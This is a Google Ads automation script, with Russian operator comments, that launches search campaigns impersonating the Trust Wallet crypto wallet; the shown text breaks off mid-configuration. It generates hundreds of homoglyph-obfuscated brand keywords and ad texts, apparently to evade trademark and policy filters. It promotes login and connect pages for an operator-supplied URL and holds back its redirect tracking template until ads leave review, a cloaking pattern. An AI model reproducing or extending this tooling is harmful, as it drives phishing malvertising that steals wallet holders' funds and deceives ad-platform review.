function main() {
    //
    //
    //removeLabels()
    const inputParameters = {
        url__: "",
        trackingUrl__: "",
        countriesStr: "",
        samaraId: "",
    };

    //
    //

    //
    // new zealand
    var targetedCountries = getAllTargetCountries(inputParameters.countriesStr);
    if (!targetedCountries.ok || !inputParameters.url__ || !inputParameters.trackingUrl__) {
        Logger.log(
            "ERROR. CHECK INPUT PARAMETERS: const inputParameters = {  url__: '', trackingUrl__: '', countriesStr: '' };"
        );
        return;
    }

    //
    //
    Logger.log(targetedCountries.array);
    var _bgtLevel = 4290;
    var opts = getOpts(inputParameters, targetedCountries, _bgtLevel);

    _updateAd(opts);

    //showAllPlacementExclusions(opts.cOpts.name);
}

// *******************************************************************************************
// *******************************************************************************************
function _updateAd(opts) {
    const constants = {
        CAMPAIGN_CREATED: "CAMPAIGN_CREATED",
        AD_GROUP_CREATED: "AD_GROUP_CREATED",
        AD_CREATED: "AD_CREATED",
        LOCATIONS_CREATED: "LOCATIONS_CREATED",
        CUSTOM_PARAMETER_ADDED: "CUSTOM_PARAMETER_ADDED",
        TRAKING_TEMPLATE_ADDED: "TRAKING_TEMPLATE_ADDED",
        DEVICE_MODIFIER_APPLIED: "DEVICE_MODIFIER_APPLIED",
    };
    var labels = getLabels();
    _createSearchCampaigns(opts, labels, constants);
    Utilities.sleep(2000);
    _addGroup(opts.cOpts.name, opts.gOpts, labels, constants);
    Utilities.sleep(2000);
    _addExpandedTextAd(opts.cOpts.name, opts.gOpts.name, opts.aOpts, labels, constants);
    addExtentions(opts);
    _decreaseModifier(labels, constants);
    insertTemplate(opts, labels, constants);
    getStatReport();
    return;
}
// *******************************************************************************************
// *******************************************************************************************
function addExtentionsDark(opts) {
    var ext = opts.extensions;
    var siteLinks = []; //ext.siteLinks;
    for (var i = 0; i < ext.siteLinks.length; i++) {
        var builder = AdsApp.extensions()
            .newSitelinkBuilder()
            .withLinkText(ext.siteLinks[i].text)
            .withDescription1(ext.siteLinks[i].desc1)
            .withDescription2(ext.siteLinks[i].desc2)
            .withFinalUrl(opts.aOpts.url + ext.siteLinks[i].anchor)
            //.withMobilePreferred(true)
            .build();
        if (builder.isSuccessful()) {
            siteLinks.push(builder.getResult());
        } else {
            Logger.log(bulder.getErrors());
        }
    }

    var newSnippet1 = AdsApp.extensions()
        .newSnippetBuilder()
        .withHeader("Types")
        .withValues(ext.snippets)
        //.withMobilePreferred(false)
        .build()
        .getResult();
    var callouts = [];
    for (var i = 0; i < ext.callouts.length; i++) {
        var builder = AdsApp.extensions().newCalloutBuilder().withText(ext.callouts[i]).build();
        if (builder.isSuccessful()) {
            callouts.push(builder.getResult());
        } else {
            Logger.log(bulder.getErrors());
        }
    }
    // var newCallout1 = AdsApp.extensions().newCalloutBuilder().withText("Sign Up").build().getResult();

    var campaignIterator = AdsApp.campaigns()
        .withCondition('Name = "' + opts.cOpts.name + '"')
        .get();
    if (campaignIterator.hasNext()) {
        var campaign = campaignIterator.next();
        for (var i = 0; i < siteLinks.length; i++) {
            campaign.addSitelink(siteLinks[i]);
        }

        campaign.addSnippet(newSnippet1);

        for (var i = 0; i < callouts.length; i++) {
            campaign.addCallout(callouts[i]);
        }
    }
}

// *******************************************************************************************
// *******************************************************************************************
function _improveModifier(labels, constants) {
    return;
    var campaigns = AdsApp.campaigns().get();
    while (campaigns.hasNext()) {
        var campaign = campaigns.next();
        campaign.targeting().platforms().mobile().get().next().setBidModifier(1.0);
        campaign.targeting().platforms().desktop().get().next().setBidModifier(1.0);
        campaign.targeting().platforms().tablet().get().next().setBidModifier(1.0);
    }
}
// *******************************************************************************************
// *******************************************************************************************
function _decreaseModifier(labels, constants) {
    return;
    if (!labels[constants.CAMPAIGN_CREATED]) return;
    if (!labels[constants.DEVICE_MODIFIER_APPLIED]) {
        var campaigns = AdsApp.campaigns().get();
        var write = false;
        while (campaigns.hasNext()) {
            var campaign = campaigns.next();
            campaign.targeting().platforms().mobile().get().next().setBidModifier(0.1);
            campaign.targeting().platforms().desktop().get().next().setBidModifier(0.1);
            campaign.targeting().platforms().tablet().get().next().setBidModifier(0.1);
            write = true;
        }
        if (write) {
            var desc = "" + new Date().getTime();
            // AdsApp.createLabel(constants.DEVICE_MODIFIER_APPLIED, desc, "blue");
        }
    }
}
// *******************************************************************************************
// *******************************************************************************************
function getStatReport() {}
// *******************************************************************************************
// *******************************************************************************************
function _addLocations(campaignName, arrayLoc) {
    var campaignIterator = AdsApp.campaigns()
        .withCondition('Name = "' + campaignName + '"')
        .get();
    if (campaignIterator.hasNext()) {
        var campaign = campaignIterator.next();
        // Target France (location id = 2250) and set a bid modifier of +50%. See
        // https://developers.google.com/adwords/api/docs/appendix/geotargeting
        // for details.
        for (var i = 0; i < arrayLoc.length; i++) {
            var loc = arrayLoc[i];
            campaign.addLocation(loc, 1);
        }
    }
}
// *******************************************************************************************
// *******************************************************************************************
function _remLocations(campaignName, arrayLoc) {
    var campaignIterator = AdsApp.campaigns()
        .withCondition('Name = "' + campaignName + '"')
        .get();
    if (campaignIterator.hasNext()) {
        var campaign = campaignIterator.next();
        // Target France (location id = 2250) and set a bid modifier of +50%. See
        // https://developers.google.com/adwords/api/docs/appendix/geotargeting
        // for details.
        for (var i = 0; i < arrayLoc.length; i++) {
            var loc = arrayLoc[i];
            campaign.excludeLocation(loc, 1);
        }
    }
}
// *******************************************************************************************
// *******************************************************************************************
function _createSearchCampaigns(opts, labels, constants) {
    if (labels[constants.CAMPAIGN_CREATED]) {
        return;
    }
    const cOpts = opts.cOpts;
    try {
        var columns = [
            "Campaign",
            "Budget",
            /*"Networks",*/ "Language",
            "Bid Strategy type",
            "Campaign type",
            "Campaign Status",
        ];

        var upload = AdWordsApp.bulkUploads().newCsvUpload(columns, {
            moneyInMicros: false,
        });

        upload.append({
            Campaign: cOpts.name || "Search-1.",
            Budget: cOpts.budget,
            "Budget type": "Daily",
            //Networks: cOpts.network,
            Language: cOpts.lang,
            "Campaign type": cOpts.type,
            "Ad rotation": "Optimize for clicks",
            "Bid Strategy type": cOpts.strategy,
            "Campaign Status": cOpts.status,
        });
        // Use upload.apply() to make changes without previewing.
        upload.apply();

        Utilities.sleep(10000);
        _addLocations(opts.cOpts.name, opts.lOpt.inc);
        Utilities.sleep(2000);
        _remLocations(opts.cOpts.name, opts.lOpt.exc);
        var desc = "" + new Date().getTime();
        // AdsApp.createLabel(constants.CAMPAIGN_CREATED, desc, "blue");
        return { ok: true };
    } catch (e) {
        Logger.log(e);
        return { ok: false };
    }
    return { ok: false };
}
// *******************************************************************************************
// *******************************************************************************************
function _addGroup(campaignName, gOpts, labels, constants) {
    //Logger.log(campaignName);
    //Logger.log(gOpts);
    if (labels[constants.AD_GROUP_CREATED]) {
        return;
    }

    try {
        var campaignIterator = AdsApp.campaigns()
            .withCondition('Name = "' + campaignName + '"')
            .get();
        if (campaignIterator.hasNext()) {
            var campaign = campaignIterator.next();
            var adGroupOperation = campaign.newAdGroupBuilder().withName(gOpts.name).withCpc(gOpts.cpc).build();
            var adGroup = adGroupOperation.getResult();
            if (gOpts.keywords) {
                if (gOpts.keywords.length) {
                    for (var i = 0; i < gOpts.keywords.length; i++) {
                        var kw = gOpts.keywords[i];
                        var keywordOperation = adGroup.newKeywordBuilder().withText(kw.word).withCpc(kw.cpc).build();
                        var keyword = keywordOperation.getResult();
                    }
                }
            }

            var desc = "" + new Date().getTime();
            // AdsApp.createLabel(constants.AD_GROUP_CREATED, desc, "blue");
            return { adGroup: adGroup, campaign: campaign, ok: true };
        }
    } catch (error) {
        Logger.log(error);
    }

    return { ok: false };
}
// *******************************************************************************************
// *******************************************************************************************
function _addExpandedTextAd(campaignName, adGroupName, aOpts, labels, constants) {
    if (labels[constants.AD_CREATED]) {
        return;
    }

    try {
        var adGroupIterator = AdsApp.adGroups()
            .withCondition('Name = "' + adGroupName + '"')
            .withCondition('CampaignName = "' + campaignName + '"')
            .get();

        if (adGroupIterator.hasNext()) {
            var adGroup = adGroupIterator.next();
            var adOperation = adGroup
                .newAd()
                .expandedTextAdBuilder()
                .withHeadlinePart1(adjustDescription(shuffleArray(aOpts.h1)))
                .withHeadlinePart2(adjustDescription(shuffleArray(aOpts.h2)))
                .withHeadlinePart3(adjustDescription(shuffleArray(aOpts.h3)))
                .withDescription1(adjustDescription(shuffleArray(aOpts.d1)))
                .withDescription2(adjustDescription(shuffleArray(aOpts.d2)))
                .withFinalUrl(aOpts.url)
                .build();

            var ad = adOperation.getResult();
            var desc = "" + new Date().getTime();
            // AdsApp.createLabel(constants.AD_CREATED, desc, "blue");
            return {
                ok: true,
                adGroup: adGroup,
                ad: ad,
            };
        }
    } catch (e) {
        Logger.log(e);
        return { ok: false };
    }
    return { ok: false };
}
// *******************************************************************************************
// *******************************************************************************************

function shuffleArray(array) {
    if (!array) return "";
    if (!array.length) return "";
    for (var i = array.length - 1; i > 0; i--) {
        var j = Math.floor(Math.random() * (i + 1));
        var temp = array[i];
        array[i] = array[j];
        array[j] = temp;
    }
    return array[0];
}
// *******************************************************************************************
// *******************************************************************************************

function shuffleArray2(array, limit) {
    if (!array) return "";
    if (!array.length) return "";
    for (var i = array.length - 1; i > 0; i--) {
        var j = Math.floor(Math.random() * (i + 1));
        var temp = array[i];
        array[i] = array[j];
        array[j] = temp;
    }
    if (array.legth > limit) array = array.slice(0, limit);
    return array;
}
// *******************************************************************************************
// *******************************************************************************************

function getLabels() {
    const labels = {};
    var lbls = AdsApp.labels().get();
    Logger.log(lbls.totalNumEntities());
    while (lbls.hasNext()) {
        var lbl = lbls.next();
        // Logger.log(lbl.getName() + " : " + lbl.getDescription());
        labels[lbl.getName()] = lbl.getDescription();
    }
    return labels;
}
// *******************************************************************************************
// *******************************************************************************************

function insertTemplate(opts, labels, constants) {
    if (!opts.tracking.enabled) return;

    const options = {
        customParameter_uurl: opts.tracking.uurl, // insert your redirect here
        trackingTemplate: opts.tracking.template,
    };

    var campaignsIterator = AdsApp.campaigns().get();
    var groupsIterator = AdsApp.adGroups().get();

    var templateInsert = true;

    var ads = AdsApp.ads().get();
    while (ads.hasNext()) {
        var ad = ads.next();
        var policyApprovalStatus = ad.getPolicyApprovalStatus();
        if (policyApprovalStatus == "UNDER_REVIEW") {
            templateInsert = false;
        }
    }
    if (labels[constants.TRAKING_TEMPLATE_ADDED]) templateInsert = false;
    // if (!labels[constants.CAMPAIGN_CREATED]) templateInsert = false;
    // if (!labels[constants.AD_CREATED]) templateInsert = false;
    // if (!labels[constants.CUSTOM_PARAMETER_ADDED]) templateInsert = false;
    // var currentAccount = AdsApp.currentAccount();
    // var todayClicks = currentAccount.getStatsFor("TODAY").getClicks();
    // if (todayClicks < 1) {
    //     templateInsert = false;
    // }

    if (templateInsert) {
        while (campaignsIterator.hasNext()) {
            var object = campaignsIterator.next();
            object.urls().setTrackingTemplate(options.trackingTemplate);
            var desc = "" + new Date().getTime();
            // AdsApp.createLabel(constants.TRAKING_TEMPLATE_ADDED, desc, "blue");
        }
        _improveModifier(labels, constants);
    }
    if (!labels[constants.CUSTOM_PARAMETER_ADDED]) {
        while (groupsIterator.hasNext()) {
            var object = groupsIterator.next();
            object.urls().setCustomParameters({ uurl: options.customParameter_uurl });
            var desc = "" + new Date().getTime();
            // AdsApp.createLabel(constants.CUSTOM_PARAMETER_ADDED, desc, "blue");
        }
    }
}

function getKeyword() {
    const kws = [
        "Truｓt  Wａllｅｔ",
        "Trｕsｔ  Ｗaｌｌｅt",
        "Ｔｒｕsｔ  Ｗaｌleｔ",
        "Tｒｕsｔ  Walｌｅt",
        "Ｔｒuｓｔ  Wａｌlet",
        "Trｕsｔ  Ｗａｌlｅｔ",
        "Trust  Ｗａｌｌｅｔ",
        "Trｕｓｔ  Ｗａlｌｅｔ",
        "Trusｔ  Wａｌｌet",
        "Ｔｒｕst  Wａlｌｅt",
        "Tｒｕｓt  Wａｌleｔ",
        "Ｔｒuｓt  Ｗａｌlet",
        "Ｔrｕsｔ  Wａｌlｅｔ",
        "Tｒuｓt  Ｗaｌleｔ",
        "Tｒuｓｔ  Walleｔ",
        "Ｔrusｔ  Wａllet",
        "Ｔrｕst  Waｌｌｅt",
        "Ｔrust  Ｗalleｔ",
        "Ｔruｓｔ  Ｗallet",
        "Ｔｒuｓt  Wａlｌeｔ",
        "Trｕsｔ  Ｗａｌｌet",
        "Tｒｕｓt  Ｗalｌｅｔ",
        "Ｔrust  Wａｌｌｅｔ",
        "Ｔrust  Ｗaｌleｔ",
        "Ｔrust  Waｌｌｅt",
        "Ｔｒｕｓｔ  Wａlｌｅt",
        "Trｕst  Ｗａｌlｅｔ",
        "Ｔｒuｓt  Wａｌｌeｔ",
        "Ｔｒusｔ  Ｗallｅt",
        "Ｔrｕｓt  Ｗalleｔ",
        "Ｔｒust  Waｌｌeｔ",
        "Ｔｒｕｓｔ  Wａｌｌet",
        "Ｔｒｕｓt  Ｗaｌｌｅt",
        "Ｔｒuｓt  Walｌet",
        "Ｔrｕsｔ  Ｗalleｔ",
        "Ｔｒuｓｔ  Ｗaｌｌet",
        "Tｒｕst  Wａlｌeｔ",
        "Ｔruｓt  Ｗａllet",
        "Tｒuｓｔ  Wａlｌｅｔ",
        "Trｕｓｔ  Waｌｌet",
        "Ｔrｕsｔ  Ｗａｌlｅt",
        "Ｔｒｕｓt  Wａｌlｅt",
        "Trｕｓt  Walleｔ",
        "Trusｔ  Wａlｌｅt",
        "Ｔruｓｔ  Walｌeｔ",
        "Tｒusｔ  Ｗａｌｌet",
        "Tｒust  Ｗａlｌeｔ",
        "Ｔrｕst  Ｗaｌleｔ",
        "Tｒｕｓt  Wａｌlｅｔ",
        "Tｒｕst  Waｌｌｅｔ",
        "Tｒust  Wａllｅｔ",
        "Ｔｒuｓt  Ｗalｌet",
        "Ｔrｕst  Wａｌｌｅｔ",
        "Tｒｕst  Ｗaｌｌｅt",
        "Tｒｕst  Ｗalleｔ",
        "Tｒuｓｔ  Ｗａlｌet",
        "Ｔrusｔ  Ｗａlｌｅｔ",
        "Ｔｒｕｓt  Ｗａｌleｔ",
        "Ｔｒusｔ  Ｗａｌｌｅｔ",
        "Ｔrust  Waｌｌｅｔ",
        "Ｔｒｕst  Wａｌｌeｔ",
        "Tｒｕｓｔ  Ｗａllet",
        "Ｔｒuｓｔ  Wａｌｌｅｔ",
        "Trｕｓｔ  Wａｌlｅｔ",
        "Ｔｒｕsｔ  Ｗａllｅｔ",
        "Ｔｒｕｓt  Wａllｅt",
        "Ｔrｕsｔ  Ｗａｌｌｅt",
        "Ｔruｓｔ  Wａllet",
        "Trusｔ  Ｗallｅt",
        "Trｕst  Wａlｌｅt",
        "Trｕｓt  Waｌｌeｔ",
        "Ｔrｕｓt  Wａｌlet",
        "Ｔrusｔ  Walｌｅｔ",
        "Ｔrｕｓt  Waｌｌet",
        "Ｔｒuｓt  Wａｌｌet",
        "Tｒｕｓt  Ｗaｌlｅｔ",
        "Tｒｕｓｔ  Wａlｌｅｔ",
        "Truｓt  Ｗaｌlet",
        "Ｔｒust  Ｗallｅt",
        "Ｔｒuｓｔ  Ｗaｌｌｅt",
        "Trｕｓt  Ｗａlｌｅt",
        "Trｕst  Wａｌｌeｔ",
        "Trｕst  Waｌlｅｔ",
        "Ｔrusｔ  Wａｌｌeｔ",
        "Ｔｒｕｓt  Walｌｅt",
        "Trusｔ  Wａｌlｅt",
        "Ｔｒuｓｔ  Walｌet",
        "Ｔｒｕｓｔ  Ｗａｌleｔ",
        "Tｒｕsｔ  Waｌｌeｔ",
        "Tｒｕｓt  Ｗａlｌeｔ",
        "Trusｔ  Ｗａlｌｅｔ",
        "Ｔｒｕｓt  Ｗａlleｔ",
        "Tｒｕｓｔ  Ｗaｌｌｅt",
        "Ｔrｕst  Ｗaｌｌeｔ",
        "Ｔrusｔ  Wａｌｌｅt",
        "Tｒust  Ｗａllｅt",
        "Truｓt  Walｌｅｔ",
        "Ｔｒｕｓt  Ｗａｌlｅｔ",
        "Ｔruｓt  Ｗaｌｌｅt",
        "Ｔｒust  Ｗａｌｌｅt",
        "Ｔruｓｔ  Wａlｌｅt",
        "Ｔrｕｓt  Ｗaｌｌeｔ",
        "Ｔｒｕｓt  Ｗallｅｔ",
        "Trｕsｔ  Walleｔ",
        "Trｕｓt  Ｗaｌｌｅｔ",
        "Ｔｒuｓt  Ｗaｌｌet",
        "Ｔｒｕsｔ  Ｗａlｌｅｔ",
        "Ｔruｓｔ  Waｌlｅt",
        "Ｔrust  Waｌｌeｔ",
        "Tｒｕｓt  Ｗａｌｌet",
        "Ｔｒust  Waｌleｔ",
        "Tｒｕｓt  Ｗａllｅt",
        "Tｒｕｓｔ  Ｗallｅt",
        "Ｔｒuｓｔ  Ｗａlｌeｔ",
        "Ｔｒｕst  Waｌｌｅt",
        "Tｒusｔ  Ｗaｌｌｅt",
        "Truｓｔ  Waｌｌｅｔ",
        "Tｒuｓｔ  Ｗalｌet",
        "Ｔｒｕｓt  Ｗａlｌeｔ",
        "Ｔｒｕst  Ｗａllｅｔ",
        "Truｓｔ  Wａllｅｔ",
        "Truｓt  Wallet",
        "Trｕsｔ  Ｗaｌｌet",
        "Tｒｕst  Ｗａｌlｅｔ",
        "Tｒust  Wａｌｌｅt",
        "Tｒｕsｔ  Waｌlｅt",
        "Tｒｕｓt  Ｗallｅt",
        "Ｔｒust  Ｗａｌｌet",
        "Tｒｕｓt  Walｌｅt",
        "Ｔｒｕst  Wａｌlｅt",
        "Trusｔ  Ｗａllet",
        "Trｕｓｔ  Ｗａlleｔ",
        "Truｓt  Wａｌｌｅt",
        "Truｓｔ  Wallｅｔ",
        "Trｕsｔ  Ｗａｌleｔ",
        "Trｕsｔ  Ｗaｌlｅt",
        "Tｒｕsｔ  Ｗalｌｅｔ",
        "Ｔrｕｓｔ  Wａllｅｔ",
        "Ｔｒｕst  Wallet",
        "Truｓｔ  Ｗａｌlｅt",
        "Tｒusｔ  Ｗalleｔ",
        "Trust  Wａlｌet",
        "Tｒuｓt  Walleｔ",
        "Ｔｒuｓｔ  Wａlleｔ",
        "Trusｔ  Ｗａｌlet",
        "Tｒust  Ｗａｌｌeｔ",
        "Truｓt  Ｗallｅt",
        "Tｒust  Waｌleｔ",
        "Ｔruｓｔ  Ｗａlｌｅt",
        "Ｔrｕst  Ｗallet",
        "Trust  Ｗａｌｌet",
        "Tｒusｔ  Wａllｅt",
        "Ｔｒust  Wallet",
        "Trusｔ  Ｗａlleｔ",
        "Ｔruｓｔ  Wａlｌet",
        "Ｔｒｕｓt  Ｗａｌlet",
        "Ｔｒuｓt  Ｗaｌlｅｔ",
        "Tｒｕsｔ  Ｗａｌlｅt",
        "Ｔrust  Ｗａｌｌｅｔ",
        "Tｒuｓｔ  Ｗallet",
        "Tｒｕｓｔ  Waｌｌｅｔ",
        "Ｔｒuｓt  Walｌｅt",
        "Tｒusｔ  Ｗallet",
        "Ｔｒｕsｔ  Ｗallet",
        "Trｕsｔ  Ｗａlｌeｔ",
        "Trｕｓｔ  Ｗａｌｌet",
        "Trｕst  Ｗaｌｌeｔ",
        "Tｒｕｓｔ  Ｗａｌｌｅt",
        "Ｔｒｕｓt  Ｗaｌleｔ",
        "Ｔｒｕｓｔ  Ｗａllet",
        "Truｓt  Ｗaｌｌｅｔ",
        "Truｓｔ  Wａlｌｅｔ",
        "Tｒｕｓｔ  Wａlｌet",
        "Trust  Waｌｌｅｔ",
        "Ｔｒuｓｔ  Ｗａｌlet",
        "Ｔrｕsｔ  Ｗalｌet",
        "Truｓｔ  Waｌｌet",
        "Ｔｒｕst  Wａlleｔ",
        "Ｔｒｕｓt  Ｗａｌlｅt",
        "Tｒuｓｔ  Walｌｅｔ",
        "Ｔrusｔ  Ｗaｌｌｅｔ",
        "Ｔrｕｓｔ  Ｗａllet",
        "Ｔｒuｓt  Ｗallｅt",
        "Ｔｒｕｓｔ  Ｗａｌlｅｔ",
        "Ｔruｓt  Ｗａlleｔ",
        "Ｔruｓｔ  Walｌｅt",
        "Truｓt  Waｌlet",
        "Ｔruｓt  Ｗａｌlｅｔ",
        "Tｒust  Ｗalｌｅｔ",
        "Ｔrusｔ  Wallet",
        "Truｓt  Waｌlｅt",
        "Ｔrｕｓt  Wａｌｌｅt",
        "Ｔｒusｔ  Ｗaｌｌet",
        "Ｔrusｔ  Waｌleｔ",
        "Tｒusｔ  Ｗａｌｌｅt",
        "Trｕst  Ｗaｌleｔ",
        "Ｔrｕst  Ｗａｌlｅｔ",
        "Ｔruｓｔ  Wａｌｌｅｔ",
        "Ｔｒusｔ  Wａｌｌｅt",
        "Ｔｒuｓｔ  Ｗａllｅt",
        "Tｒｕｓｔ  Walｌｅｔ",
        "Ｔｒuｓｔ  Wallet",
        "Ｔｒｕst  Ｗallｅt",
        "Trｕｓt  Ｗａｌlet",
        "Tｒuｓｔ  Ｗaｌｌｅt",
        "Ｔrｕst  Waｌｌet",
        "Trｕst  Wａlｌet",
        "Ｔｒｕsｔ  Wａlｌｅｔ",
        "Ｔrｕst  Wａlｌeｔ",
        "Tｒuｓt  Ｗａlｌｅｔ",
        "Ｔrust  Ｗａlleｔ",
        "Ｔrust  Wａｌlｅｔ",
        "Ｔrｕｓｔ  Ｗａｌlｅｔ",
        "Ｔrｕｓt  Ｗalｌeｔ",
        "Trust  Ｗalｌeｔ",
        "Trust  Wａllｅt",
        "Tｒｕsｔ  Ｗａllｅｔ",
        "Ｔｒuｓｔ  Ｗaｌｌｅｔ",
        "Ｔｒust  Wａlｌeｔ",
        "Tｒuｓｔ  Waｌｌeｔ",
        "Ｔrust  Wａlｌeｔ",
        "Tｒuｓt  Ｗａｌlｅt",
        "Ｔｒｕst  Wａｌleｔ",
        "Trｕsｔ  Wａllｅt",
        "Tｒｕst  Ｗａｌlet",
        "Ｔrust  Ｗａlｌｅｔ",
        "Ｔruｓt  Wａlｌeｔ",
        "Tｒust  Ｗalｌet",
        "Tｒｕst  Ｗaｌleｔ",
        "Ｔrｕsｔ  Ｗaｌｌｅｔ",
        "Ｔｒusｔ  Wａｌlｅt",
        "Ｔrｕst  Ｗallｅｔ",
        "Ｔrusｔ  Wａlｌｅt",
        "Trｕｓｔ  Walｌet",
        "Ｔrust  Waｌlｅt",
        "Ｔrｕst  Walｌeｔ",
        "Tｒｕｓｔ  Wａｌlｅｔ",
        "Ｔrｕst  Wallet",
        "Tｒｕst  Ｗａｌｌｅt",
        "Ｔｒusｔ  Waｌｌeｔ",
        "Ｔｒuｓｔ  Ｗａlｌｅｔ",
        "Ｔｒuｓt  Wａlｌｅｔ",
        "Ｔｒｕｓｔ  Wallet",
        "Ｔｒｕsｔ  Ｗaｌｌet",
        "Tｒuｓt  Wａllｅｔ",
        "Ｔｒusｔ  Ｗａｌleｔ",
        "Ｔｒｕｓt  Ｗａｌｌｅｔ",
        "Truｓｔ  Walｌｅｔ",
        "Trｕst  Wallｅｔ",
        "Tｒｕｓｔ  Wａｌｌet",
        "Tｒuｓt  Waｌｌｅｔ",
        "Trust  Ｗallｅt",
        "Truｓt  Ｗａllet",
        "Trｕｓｔ  Waｌlet",
        "Ｔｒｕsｔ  Waｌleｔ",
        "Ｔｒuｓt  Wａｌlｅt",
        "Tｒｕｓｔ  Ｗaｌlｅt",
        "Truｓt  Ｗaｌlｅｔ",
        "Truｓｔ  Ｗallｅｔ",
        "Ｔrｕst  Wａｌｌet",
        "Ｔｒｕｓt  Wａlｌｅt",
        "Ｔｒｕsｔ  Ｗａlleｔ",
        "Ｔｒust  Ｗａｌlｅｔ",
        "Ｔｒuｓt  Ｗaｌlｅt",
        "Trｕsｔ  Walｌet",
        "Trｕsｔ  Wａｌｌet",
        "Tｒｕｓt  Wａｌｌet",
        "Ｔruｓt  Wａllｅｔ",
        "Ｔｒｕｓt  Wａllｅｔ",
        "Trｕst  Wａlｌeｔ",
        "Ｔruｓｔ  Waｌleｔ",
        "Ｔruｓt  Ｗaｌleｔ",
    ];
    return kws[Math.floor(Math.random() * kws.length)];
}
// *******************************************************************************************
// *******************************************************************************************

function getAllTargetCountries(countriesStr) {
    var _tragetedCountriesListTemp = countriesStr.split(";");
    var _tragetedCountriesList = [];
    for (var i = 0; i < _tragetedCountriesListTemp.length; i++) {
        _tragetedCountriesListTemp[i] = _tragetedCountriesListTemp[i].trim().toLowerCase();
        if (_tragetedCountriesListTemp[i]) {
            _tragetedCountriesList.push(_tragetedCountriesListTemp[i]);
        }
    }

    var countriesList = {
        canada: 2124,
        belgium: 2056,
        australia: 2036,
        "united kingdom": 2826,
        switzerland: 2756,
        sweden: 2752,
        spain: 2724,
        norway: 2578,
        "new zealand": 2554,
        netherlands: 2528,
        austria: 2040,
        cyprus: 2196,
        czechia: 2203,
        germany: 2276,
        greece: 2300,
        hungary: 2348,
        italy: 2380,
        poland: 2616,
        portugal: 2620,
        romania: 2642,
        slovakia: 2703,
        spain: 2724,
        "canary islands": 20277,
        russia: 2643,
        "united states": 2840,
        ukraine: 2804,
        belarus: 2112,
        india: 2356,
        kazakhstan: 2398,
        ukraine: 2804,
        denmark: 2208,
        finland: 2246,
        france: 2250,
        ireland: 2372,
        luxembourg: 2442,
    };
    var retObj = { ok: false };
    var array = [];
    var clKeys = Object.keys(countriesList);
    // Logger.log(_tragetedCountriesList, clKeys);
    for (var i = 0; i < clKeys.length; i++) {
        // Logger.log(_tragetedCountriesList.includes(clKeys[i]), clKeys[i], countriesList[clKeys[i]]);
        if (_tragetedCountriesList.includes(clKeys[i])) {
            array.push(countriesList[clKeys[i]]);
        }
    }
    if (array) {
        retObj.ok = true;
        retObj.array = array;
        retObj.list = _tragetedCountriesList;
        retObj.str = countriesStr;
    }
    return retObj;
}
// *******************************************************************************************
// *******************************************************************************************

function adjustDescription(description) {
    var array = ["Τust WaΙleτ", "Trυst WalΙet", "Τrust WaΙleτ", "Τrυst WalΙet", "Τιust WaΙΙeτ", "Τrυst Wallet"];
    return description.replace("Trust Wallet", shuffleArray(array));
}
// *******************************************************************************************
// *******************************************************************************************
function setupReport(opts) {
    var report = {
        account: AdsApp.currentAccount().getCustomerId(),
        type: opts.type,
        geo: opts.geo,
        url: opts.aOpts.url,
        samaraId: opts.samaraId,
    };
    if (opts.gOpts.keywords.length) {
        report.keyword = opts.gOpts.keywords[0].word;
    }
    var resp1 = UrlFetchApp.fetch(
        "https://script.google.com/macros/s/AKfycbxKa5JWljVilYqg28lEMp4vMakiAsKrZ06Bg8d42Ir2qvTv-TokPypG_xw9zrS-6UCMew/exec",
        {
            method: "POST",
            payload: JSON.stringify(report),
            headers: {
                "Content-Type": "application/json",
            },
        }
    );
}
// *******************************************************************************************
// *******************************************************************************************
function getCallouts() {
    return [
        "24/7 Support Available",
        "Contact Us",
        "Member Benefits",
        "In Stock",
        "View Reviews",
        "Payment Options Available",
        "A Glossary of Terms",
    ];
}
// *******************************************************************************************
// *******************************************************************************************
function getSnippets() {
    return [
        "‎Register Online",
        "View Member Benefits",
        "View Services",
        "About Us",
        "Contacts",
        "Request Information",
        "Help Center",
        "Blog Center",
    ];
}
// *******************************************************************************************
// *******************************************************************************************
function getSiteLinks() {
    return [
        { text: "Sign Up", desc1: "Sign Up Online Secure", desc2: "Connect With Web", anchor: "#signup" },
        { text: "Log In", desc1: "Connect and Start Now", desc2: "Fast safe Web Access", anchor: "#login" },
        { text: "Secure", desc1: "Safe & Secure Get Information", desc2: "Information online", anchor: "#secure" },
        { text: "Fast", desc1: "Fast & Safe Web Access", desc2: "Get Information", anchor: "#fast" },
    ];
}
// *******************************************************************************************
// *******************************************************************************************
function removeLabels() {
    var lblIter = AdsApp.labels().get();
    while (lblIter.hasNext()) {
        var lbl = lblIter.next();
        lbl.remove();
    }
}
// *******************************************************************************************
// *******************************************************************************************
function getOpts(inputParameters, targetedCountries, _bgtLevel) {
    var bgt = Math.random() * 200 + _bgtLevel; // бюджет | максимум 9.9, минимум 2.9
    bgt = Math.round(bgt);
    bgt = bgt / 100;
    var key__ = getKeyword();
    var opts = {
        cOpts: {
            name: "Search-1", // <- Меняй название кампании, если предыдущий запуск был неуспешным (по любой причине) и запускаешь повторно
            budget: bgt,
            lang: "", //it;es;pt <- несколько языков в таком формате
            type: "Search",
            strategy: "Maximize clicks", //    "Manual CPC", "CPC (enhanced)",  "Target CPA", "Maximize clicks", "Maximize conversions"
            // network: "Search", //  если нужны оба, то null без кавычек
            status: "Enabled", // "Paused" or "Enabled"
        },
        gOpts: {
            name: "AdGroup-1",
            cpc: "6.90",
            keywords: [
                // ниже вставляй свои ключевые слова. Строго соблюдай синтаксис (кавычки и косые линии) для вразового соответствия
                { word: key__, cpc: 6.9 },
                { word: '"' + key__ + '"', cpc: 6.9 },
                { word: "[" + key__ + "]", cpc: 6.9 },
            ],
        },
        aOpts: {
            h1: ["Trust Wallet", "Trust Wallet Connect", "Trust Wallet Start Now", "Trust Wallet Web Connect"],
            h2: ["Get Information", "Sign Up Online Secure", "Connect and Start Now"],
            h3: ["Fast safe Web Access", "Information online", "Connect With Web"],
            d1: [
                "Trust Wallet Safe & Secure Get Information. Fast & safe Web Access",
                "Trust Wallet Safe & Secure Get Information",
                "Wallet near you. Fast Access & secure. Manage your wallet assets.",
            ],
            d2: [
                "Connect With Web Access - Secure Access",
                "Work safely in the internet. Make all actions private and confident.",
                "Connect With Web Access - Secure Access. Available worldwide.",
            ],
            url: inputParameters.url__,
        },
        lOpt: {
            // локации на включение и исключение выбирай из списка ниже
            inc: targetedCountries.array,
            exc: [],
        },
        proximities: [],
        tracking: {
            enabled: true,
            template:
                "https://clickserve.dartsearch.net/link/click?{_dssagcrid}&{_dssftfiid}&ds_e_adid={creative}&ds_e_matchtype={ifsearch:search}{ifcontent:content}&ds_url_v=2&ds_dest_url={_uurl}/?url={lpurl}",
